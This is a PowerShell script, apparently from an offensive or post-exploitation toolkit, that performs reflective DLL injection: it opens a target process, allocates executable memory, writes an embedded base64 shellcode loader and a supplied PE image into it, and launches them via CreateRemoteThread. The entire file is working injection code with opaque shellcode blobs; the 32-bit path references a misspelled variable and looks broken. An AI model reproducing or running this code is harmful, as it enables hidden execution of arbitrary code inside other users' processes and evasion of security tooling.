function Invoke-ReflectDllInjection
{
    param([Parameter(Mandatory=$true,Position=0)][int]$id,[Parameter(Mandatory=$true,Position=1)][Byte[]]$PEBytes,[Parameter(Mandatory=$true,Position=1)][bool]$is64bit)
    Set-StrictMode -Version 2
    $PEBytes_=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length);
    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes,0,$PEBytes_,$PEBytes.Length);
    $b64_x64='VkiJ5kiD5PBIg+wg6CMBAABIifRew8zM6eP////MzMxIi8RIiVgISIloEEiJcBhIiXggQVZIg+wQZUiLBCVgAAAAi+qL8UUz9kyLQBhNi1AQTTlyMA+EuwAAAE2LSjBFi8ZBDxBCWE2LEkljQTzzD38EJEaLnAiIAAAARYXbdNFIiwQkSMHoEGZEO/BzJEiLTCQID7fQD74BQcHIDYA5YXwEQYPA4EQDwEj/wUiD6gF15EQ7xnWaT40EGUWL3kGLWCBJA9lFOXAYdoaLO0GL1kkD+UiNWwQPvg9I/8fByg0D0YTJdfE71XQOQf/DRTtYGHLY6Vn///9Bi0AkQ40MG0kDwQ+3FAFBi0gcSQPJiwSRSQPB6wIzwEiLXCQgSItsJChIi3QkMEiLfCQ4SIPEEEFew8xIiVwkIFVWV0FUQVVBVkFXSIvsSIPsQEiL8cdF4HVzZXJFM+THReQzMi5ku9oWr5Jmx0XobGyLy0SIZeq6cmB3dMdF8G1zdmPHRfRydC5kZsdF+GxsRIhl+uiO/v//TIvoSI1N4EH/1UiNTfBB/9W6b+BT5YvL6HH+//+6fo2kUkiJRUCLy+hh/v//umCawlW5TxeaPkiL2OhP/v//TGN+PEWNTCRATAP+SIlFUDPJTIl9SEG4ADAAAEyL8EGLV1D/00WLR1RFjVwkAUiL+EiL1k2FwHQQSCvGigqIDBBJA9NNK8N180EPt08URQ+3TwZJA89Nhcl0NUiDwSyLUfhNK8tEiwFIA9dEi1H8TAPGTYXSdBBBigBNA8OIAkkD000r03XwSIPBKE2FyXXPQYufkAAAAEgD30Q5YwwPhJoAAABMi31Ai0sMSAPPQf/VizNMi+BEi3MQSAP3TAP361hIhfZ0LkiDPgB9KEljRCQ8D7cWQouMIIgAAABCi0QhEEKLTCEcSCvQSQPMiwSRSQPE6xBJixZJi8xIg8ICSAPXQf/XSYkGSI1GCEmDxghIhfZID0TGSIvwSYM+AHWiSIPDFEUz5EQ5YwwPhXf///9Mi31IRY1cJAFMi3VQTIvXTStXMEU5p7QAAAAPhLMAAABFi4ewAAAATAPHQYtABIXAD4SdAAAAvv8PAABBvQIAAABBixBJjVgIRIvISAPXSYPpCEnR6XRpTSvLRA+3G0EPt8NBD7fLZsHoDGaD+Ap1D0wj3k0BFBNBuwEAAADrOUG7AQAAAGaD+AN1CUgjzkQBFBHrJGZBO8N1EEgjzkmLwkjB6BBmAQQR6w5mQTvFdQhII85mRAEUEUkD3U2FyXWXQYtABEwDwEGLQASFwA+Fbv///0GLXyhFM8Az0kiDyf9IA99B/9ZFM8BIi89BjVAB/9NIi5wkmAAAAEiDxEBBX0FeQV1BXF9eXcM=';
    $b54_x32='g+wwU1VWvtoWr5LHRCQkdXNlcle6cmB3dMdEJCwzMi5ki85mx0QkMGxsxkQkMgDHRCQ0bXN2Y8dEJDhydC5kZsdEJDxsbMZEJD4A6FECAACL2I1EJChQiVwkGP/TjUQkNFD/07pv4FPli87oMQIAALp+jaRSiUQkHIvO6CECAAC6YJrCVblPF5o+i/DoEAIAAItsJERqQGgAMAAAiUQkLItdPAPdiVwkGP9zUGoA/9aLc1SL+Il8JCCL1YX2dA+LzyvNigKIBBFCg+4BdfUPt0sUD7drBoPBLIXtdDGLRCREA8uLUfhNizED14tZ/APwhdt0D4oGiAJCRoPrAXX1i0QkRIPBKIXtddmLXCQQi7OAAAAAA/eJdCREg34MAHR+i0YMA8dQ/1QkGItuEIseA+8D34lEJBiDfQAAdFCL8IXbdCKLC4XJeRyLRjwPt8mLRDB4K0wwEItEMByNBIiLBDADxusOi0UAg8ACA8dQVv9UJCSJRQCDxQSF241DBA9Ew4N9AACL2HW2i3QkRIPGFIl0JESDfgwAdYaLXCQQi+8razSDu6QAAAAAD4TRAAAAi7OgAAAAA/eJdCREjU4EiwGJTCQUhcAPhLQAAACLFo1eCIlcJBwD141Y+NHrD4SDAAAAi3QkHA+3BkuJRCQcD7fIZsHoDA+3+Il8JBhmg/gKdQ6LRCQcJf8PAAABLBDrQItEJBhmg/gDdQuB4f8PAAABLBHrKzP/R2Y7x3URgeH/DwAAi8XB6BBmAQQR6xJqAl9mO8d1CoHh/w8AAGYBLBFqAlgD8IXbdY2LfCQgi3QkRItMJBQDMYl0JESNTgSLAYlMJBSFwA+FUP///4tcJBCLcyhqAGoAav8D9/9UJDAzwGoAQFBX/9ZfXl1bg8Qww4PsGGShMAAAAFNVVotADFeJVCQgiUwkHItwDOmaAAAAi1YYM8mLRjCLXiyLNolEJBiLQjyJVCQQi0QQeIlEJBSFwHR2wesQM/+F23Qji1QkGA++LDrByQ2APDphfAODweADzUc7+3Lpi1QkEItEJBQ7TCQcdUSLbBAgM/+LTBAYA+qJTCQkhcl0MItFADPbA8KNbQSJRCQYi9CKCsHLDQ++wQPYQoTJdfGLVCQQO1wkIHQbRzt8JCRy0IN+GAAPhVz///8zwF9eXVuDxBjDi3QkFItEFiSNBHgPtwwQi0QWHI0EiIsEEAPC69s=';
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress',[Type[]]@([System.Runtime.InteropServices.HandleRef],[string]))
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        
        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
    }
    $pCreateRemoteThread = Get-ProcAddress kernel32.dll CreateRemoteThread;
    $pWriteProcessMemory = Get-ProcAddress kernel32.dll WriteProcessMemory;
    $pVirtualAllocEx= Get-ProcAddress kernel32.dll VirtualAllocEx;
    $pOpenProcess = Get-ProcAddress kernel32.dll OpenProcess;

    $OpenProcessDelegate = Get-DelegateType @([int],[int],[int]) ([IntPtr]);
    $WriteProcessMemoryDelegate= Get-DelegateType  @([IntPtr],[IntPtr],[IntPtr],[long],[IntPtr]) ([int]);
    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr],[System.IntPtr],[int],[int],[UInt32])  ([IntPtr]);
    $VirtualProtectExDelegate =Get-DelegateType  @([IntPtr],[IntPtr],[UInt32],[UInt32],[Ref])  ([int]);
    $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Int64], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
    
    $OpenProcess=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pOpenProcess,$OpenProcessDelegate);
    $CreateRemoteThread=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCreateRemoteThread,$CreateRemoteThreadDelegate);
    $WriteProcessMemory=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pWriteProcessMemory,$WriteProcessMemoryDelegate);
    $VirtualAllocEx=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pVirtualAllocEx,$VirtualAllocExDelegate);
    $code = @"
            using System;
            using System.Runtime.InteropServices;
            namespace va9 {
                    public class func {
                            [Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
                            [Flags] public enum MemoryProtection { ReadWrite = 0x04, PAGE_EXECUTE_READWRITE= 0x10 }
                            [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
                            [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                            [DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
                           
                    }
            }
"@
    add-type -TypeDefinition $code
    $hProcess= $OpenProcess.Invoke(2097151,0,$id);
   if($is64bit)
   {
    [Byte[]]$shellcode_ = [System.Convert]::FromBase64String($b64_x64);
   }else {
    [Byte[]]$shellcode_ = [System.Convert]::FromBase64String($b64_x32);
   }
    
    $shellcode=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode_.Length);
    [System.Runtime.InteropServices.Marshal]::Copy($shellcode_,0,$shellcode,$shellcode_.Length);
    
    [Uint32]$dwProtect = 0
    $lpshellcode = $VirtualAllocEx.Invoke($hProcess,0, $shellcode_.Length + 1, [va9.func+AllocationType]::Reserve -bOr [va9.func+AllocationType]::Commit, [va9.func+MemoryProtection]::PAGE_EXECUTE_READWRITE)
    $lpfilebase = $VirtualAllocEx.Invoke($hProcess,0, $PEBytes.Length + 1, [va9.func+AllocationType]::Reserve -bOr [va9.func+AllocationType]::Commit, [va9.func+MemoryProtection]::PAGE_EXECUTE_READWRITE)
    if ([Bool]!$lpshellcode) { $global:result = 3; return }
    $WriteProcessMemory.Invoke($hProcess,$lpshellcode,$shellcode,$shellcode_.Length,0);
    $WriteProcessMemory.Invoke($hProcess,$lpfilebase,$PEBytes_,$PEBytes.Length,0);
    if ($true ) {
            [IntPtr] $hthread = $CreateRemoteThread.Invoke($hProcess,[IntPtr]::Zero, 1024*1024,$lpshellcode,$lpfilebase,0,[IntPtr]::Zero);
            if ([Bool]!$hthread) { $global:result = 7; return }
            $nUOF3 = [va9.func]::WaitForSingleObject($hthread, [va9.func+Time]::Infinite)
    }

}




